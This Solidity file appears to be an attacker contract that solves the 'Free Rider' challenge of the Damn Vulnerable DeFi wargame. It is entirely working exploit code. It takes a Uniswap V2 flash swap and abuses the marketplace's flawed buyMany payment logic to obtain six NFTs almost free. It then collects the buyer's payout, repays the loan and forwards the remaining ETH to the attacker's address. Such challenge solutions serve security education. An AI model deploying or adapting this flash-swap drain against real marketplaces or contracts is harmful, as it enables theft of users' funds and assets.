// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "../free-rider/FreeRiderBuyer.sol"; 
import "../free-rider/FreeRiderNFTMarketplace.sol";
import "../DamnValuableNFT.sol";
import "@uniswap/v2-core/contracts/interfaces/IERC20.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";


interface IUniswapV2Callee {
  function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;
}

contract FreeRiderAttacker is IUniswapV2Callee, IERC721Receiver {


    FreeRiderBuyer freeRiderBuyer;
    FreeRiderNFTMarketplace freeRiderNFTMarketplace;
    DamnValuableNFT dvNFT;
    address attackerAddress;
    address pairUniswapAddress;
    

    constructor(address _freeRiderAddress, address payable _freeRiderNFTMPAdress, address _nftAddress, address _pairUniswapAddress, address _attackerAddress) {
        freeRiderBuyer = FreeRiderBuyer(_freeRiderAddress);
        freeRiderNFTMarketplace = FreeRiderNFTMarketplace(_freeRiderNFTMPAdress);
        dvNFT = DamnValuableNFT(_nftAddress);
        pairUniswapAddress = _pairUniswapAddress;
        attackerAddress = _attackerAddress;
    }
   
    function flashSwap(address _tokenAddress, uint256 _amount) external{

        address token0  = IUniswapV2Pair(pairUniswapAddress).token0();
        address token1  = IUniswapV2Pair(pairUniswapAddress).token1();
        uint amount0Out = _tokenAddress == token0 ? _amount : 0;
        uint amount1Out = _tokenAddress == token1 ? _amount : 0;

        bytes memory data = abi.encode(_tokenAddress, _amount);
        IUniswapV2Pair(pairUniswapAddress).swap(amount0Out, amount1Out, address(this), data);

    }

    
    function sendNFTs() private {
        for (uint i = 0; i < 6; i++){
            dvNFT.safeTransferFrom(address(this), address(freeRiderBuyer), i);
        }
    }

    function uniswapV2Call(address _sender, uint _amount0, uint _amount1, bytes calldata _data) override external {
        require(msg.sender == pairUniswapAddress, "Pair contract must be the caller");
        require(_sender == address(this), "Sender is not this contract address");

        //Decode data
        (address wethAddress, uint256 amount) = abi.decode(_data, (address, uint256));

        //Convert WETH to ETH. Withdraw from WETH contract.
        console.log("Current balance (WEI):",address(this).balance);
        (bool success,) = wethAddress.call(abi.encodeWithSignature("withdraw(uint256)", amount));
        require(success, "WETH contract withdraw call failed!");
        console.log("Conversion from flash-swapped WETH to ETH succeeded!. Balance increased to (WEI):",address(this).balance);

        //Purchase all NFTs to this contract  
        uint256[] memory tokenIds = new uint256[](6);

        for (uint i = 0; i < 6 ; i++){
            tokenIds[i] = i;
        }        
        freeRiderNFTMarketplace.buyMany{value: 15 ether }(tokenIds);
        console.log("NFTs bought, let's send them to Buyer contract!");
        console.log("Balance after buying NFTs (WEI):",address(this).balance);


        //Send all NFTs to buyer contract.
        sendNFTs();
        console.log("NFTs sent, ETH payout received in attacker's address!");

        //Compute repayment to Uniswap pair contract
        uint256 fee = ((amount * 3)/997) + 1;
        uint256 amountToRepay = amount + fee; 
        console.log("Amount to repay (20 WETH + fee):",amountToRepay);

        //Deposit ETH to WETH contract. ETH withdrawn plus Uniswap fee. 
        (bool success2,) = wethAddress.call{value: amountToRepay}("");
        require(success2, "WETH contract deposit call failed!");
        console.log("ETH deposited! Contract balance now is:",address(this).balance);

        //Repay WETH to Uniswap pair contract
        IERC20(wethAddress).transfer(pairUniswapAddress, amountToRepay);
        console.log("Flash swap returned to Uniswap pair contract!");
        
        (bool success3, ) = attackerAddress.call{value: address(this).balance}("");
        require(success3, "ETH transfer to attacker address failed");
        console.log("Balance transfered to attacker address!");

        
    }

    //Needed to receive NFTs from Marketplace 
    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external pure override returns (bytes4) 
    {
        return IERC721Receiver.onERC721Received.selector;
    }
    
    //Needed to receive ETH funds from WETH contract 
    receive() external payable {
            
    }

}